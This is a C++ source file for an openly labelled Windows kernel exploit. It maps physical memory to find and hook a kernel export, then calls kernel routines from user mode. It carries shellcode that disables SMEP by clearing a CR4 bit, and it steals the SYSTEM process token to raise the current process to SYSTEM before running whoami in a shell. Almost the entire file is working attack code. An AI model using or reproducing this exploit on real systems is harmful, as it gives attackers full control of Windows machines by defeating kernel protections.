/*

    MIT License

    Copyright (c) 2021 Kento Oki

    Permission is hereby granted, free of charge, to any person obtaining a copy
    of this software and associated documentation files (the "Software"), to deal
    in the Software without restriction, including without limitation the rights
    to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
    copies of the Software, and to permit persons to whom the Software is
    furnished to do so, subject to the following conditions:

    The above copyright notice and this permission notice shall be included in all
    copies or substantial portions of the Software.

    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
    SOFTWARE.

*/

#include "exploit.hpp"

exploit::exploit(std::string hook_function_name)
{
    this->hook_function_name = hook_function_name;
}

exploit::~exploit()
{
    
}

bool exploit::execute()
{
    this->hook_target = 
        reinterpret_cast<void*>(
            ntoskrnl::singleton().find_export(this->hook_function_name).as_abs());

    if (!this->hook_target)
    {
        print_bad("failed to find hook target\n");
        return false;
    }
    else
        print_good("hook target: 0x%p\n", this->hook_target);

    // prepare prologue
    memcpy(&hook_target_stub[0], this->hook_target, sizeof(hook_target_stub));

    print_info("looking for stub in entire page table...\n");

    // base address of stub should be @+[func rva]%[page size]
    const auto page_offset = 
        ntoskrnl::singleton().find_export(this->hook_function_name).as_rva() % PAGE_SIZE;
    
    // scan the entire physical memory
    bool scan_result = libphys::scan(
        reinterpret_cast<libphys::delegate::fn_callback_t>(&validation_callback),
        reinterpret_cast<libphys::delegate::fn_map_phys_t>(&map_callback),
        reinterpret_cast<libphys::delegate::fn_unmap_phys_t>(&unmap_callback),
        page_offset);

    if (!scan_result)
    {
        printf("\n");
        print_bad("not found\n");
    }

    this->ntoskrnl_image_base = helper::find_system_module_image_base("ntoskrnl.exe");

    if (!this->ntoskrnl_image_base)
    {
        print_bad("failed to locate ntoskrnl image base\n");
        return false;
    }
    else
        print_good("ntoskrnl image base: 0x%llX\n", this->ntoskrnl_image_base);

    const auto pid = this->kernel_invoke<PsGetCurrentProcessId>(
        reinterpret_cast<void*>(
            this->ntoskrnl_image_base +
            ntoskrnl::singleton().find_export("PsGetCurrentProcessId").as_rva()));

    const auto is_ok = 
        reinterpret_cast<DWORD>(pid) == GetCurrentProcessId();

    print_info("PsGetCurrentProcessId returned %d\n", pid);

    if (is_ok)
    {
        print_good("stub is ok\n");

        const auto steal_token_success = this->steal_token();

        unsigned long long cr4 = 0;
        static auto ntoskrnl_image_base = this->ntoskrnl_image_base;
        static uint16_t dos_signature = 0x0;

        this->disable_smep(&cr4);
        this->exec_in_kernel([]() -> void
            {
                dos_signature = *(uint16_t*)(ntoskrnl_image_base);
            });
        this->enable_smep(&cr4);
        
        if (dos_signature == IMAGE_DOS_SIGNATURE)
            print_good("ntoskrnl's dos signature MZ: 0x%02X\n", dos_signature);
        else
            print_bad("invalid ntoskrnl dos signature: 0x%02X\n", dos_signature);

        if (steal_token_success)
        {
            print_good("steal token successfully done\n");
            this->open_shell();
        }
        else
        {
            print_bad("failed to steal token\n");
            return false;
        }
    }
    else
    {
        print_bad("bad stub\n");
        return false;
    }

    print_info("done!\n");
    return true;
}

void exploit::open_shell()
{
    print_info("> whoami\n");
    printf("[\033[96m*\033[0m]\033[31m ");
    system("cmd.exe /c whoami");
    printf("\033[0m");
    return;
}

void exploit::kmemcpy(void* dst, void* src, size_t size)
{
    this->kernel_invoke<decltype(&memcpy)>(
        reinterpret_cast<void*>(
            this->ntoskrnl_image_base +
            ntoskrnl::singleton().find_export("memcpy").as_rva()),
        dst, src, size);
}

void exploit::disable_smep(unsigned long long* old_cr4)
{
    static uint8_t disable_smep_shellcode[] = {
        0xFA,                               // cli
        0x0F, 0x20, 0xE0,                   // mov rax, cr4
        0x48, 0x89, 0x01,                   // mov QWORD PTR [rcx], rax
        0x48, 0x25, 0xFF, 0xFF, 0xEF, 0xFF, // and rax, 0xffffffffffefffff
        0x0F, 0x22, 0xE0,                   // mov cr4, rax
        0xC3 };                             // ret

    this->execute_shellcode_in_kernel<fn_disable_smep_t>(
        reinterpret_cast<uint8_t*>(&disable_smep_shellcode),
        sizeof(disable_smep_shellcode),
        old_cr4);
}

void exploit::enable_smep(unsigned long long* old_cr4)
{
    static uint8_t enable_smep_shellcode[] = {
        0x48, 0x8B, 0x01, // mov rax, QWORD PTR [rcx]
        0x0F, 0x22, 0xE0, // mov cr4, rax
        0xFB,             // sti
        0xC3 };           // ret

    this->execute_shellcode_in_kernel<fn_enable_smep_t>(
        reinterpret_cast<uint8_t*>(&enable_smep_shellcode),
        sizeof(enable_smep_shellcode),
        old_cr4);
}

void exploit::exec_in_kernel(fn_user_function_t user_function)
{
    const auto previous_affinity = this->kernel_invoke<KeQueryActiveProcessors>(
        reinterpret_cast<void*>(
            this->ntoskrnl_image_base +
            ntoskrnl::singleton().find_export("KeQueryActiveProcessors").as_rva()));

    // Set a logical processor of execution thread so the Windows schedular
    // will not touch this thread
    this->kernel_invoke<KeSetSystemAffinityThread>(
        reinterpret_cast<void*>(
            this->ntoskrnl_image_base +
            ntoskrnl::singleton().find_export("KeSetSystemAffinityThread").as_rva()),
        static_cast<KAFFINITY>(1));

    this->kernel_invoke<fn_user_function_t>(user_function);

    this->kernel_invoke<KeSetSystemAffinityThread>(
        reinterpret_cast<void*>(
            this->ntoskrnl_image_base +
            ntoskrnl::singleton().find_export("KeSetSystemAffinityThread").as_rva()),
        previous_affinity);
}

bool exploit::steal_token()
{
    NTSTATUS nt_status = STATUS_SUCCESS;
    PEPROCESS system_process, current_process;
    PACCESS_TOKEN system_token, current_token;

    nt_status = this->kernel_invoke<PsLookupProcessByProcessId>(
        reinterpret_cast<void*>(
            this->ntoskrnl_image_base +
            ntoskrnl::singleton().find_export("PsLookupProcessByProcessId").as_rva()),
        (HANDLE)4, &system_process);

    if (!NT_SUCCESS(nt_status))
    {
        print_bad("failed to lookup system process\n");
        return false;
    }
    else
        print_good("system process @ 0x%p\n", system_process);

    nt_status = this->kernel_invoke<PsLookupProcessByProcessId>(
        reinterpret_cast<void*>(
            this->ntoskrnl_image_base +
            ntoskrnl::singleton().find_export("PsLookupProcessByProcessId").as_rva()),
        (HANDLE)GetCurrentProcessId(), &current_process);

    if (!NT_SUCCESS(nt_status))
    {
        print_bad("failed to lookup current process\n");
        return false;
    }
    else
        print_good("current process @ 0x%p\n", current_process);

    system_token = this->kernel_invoke<PsReferencePrimaryToken>(
        reinterpret_cast<void*>(
            this->ntoskrnl_image_base +
            ntoskrnl::singleton().find_export("PsReferencePrimaryToken").as_rva()),
        system_process);

    current_token = this->kernel_invoke<PsReferencePrimaryToken>(
        reinterpret_cast<void*>(
            this->ntoskrnl_image_base +
            ntoskrnl::singleton().find_export("PsReferencePrimaryToken").as_rva()),
        current_process);

    for (auto offset = 0ul; 
        offset < sizeof(void*) * 0xb0; 
        offset += sizeof(void*))
    {
        const auto addr = 
            reinterpret_cast<void*>(
                reinterpret_cast<uint64_t>(current_process) + offset);

        uint64_t value;
        this->kmemcpy(&value, addr, sizeof(uint64_t));

        const auto probable_token = 
            reinterpret_cast<PACCESS_TOKEN>(
                value & (static_cast<ULONG_PTR>(~0xf)));

        if (probable_token == current_token)
        {
            const auto system_token_addr =
                reinterpret_cast<void*>(
                    reinterpret_cast<uint64_t>(system_process) + offset);

            this->kmemcpy(addr, system_token_addr, sizeof(uint64_t));

            this->kernel_invoke<PsDereferencePrimaryToken>(
                reinterpret_cast<void*>(
                    this->ntoskrnl_image_base +
                    ntoskrnl::singleton().find_export("PsDereferencePrimaryToken").as_rva()),
                current_token);

            this->kernel_invoke<PsDereferencePrimaryToken>(
                reinterpret_cast<void*>(
                    this->ntoskrnl_image_base +
                    ntoskrnl::singleton().find_export("PsDereferencePrimaryToken").as_rva()),
                system_token);

            this->kernel_invoke<ObDereferenceObject>(
                reinterpret_cast<void*>(
                    this->ntoskrnl_image_base +
                    ntoskrnl::singleton().find_export("ObDereferenceObject").as_rva()),
                current_process);

            return true;
        }
    }

    return false;
}
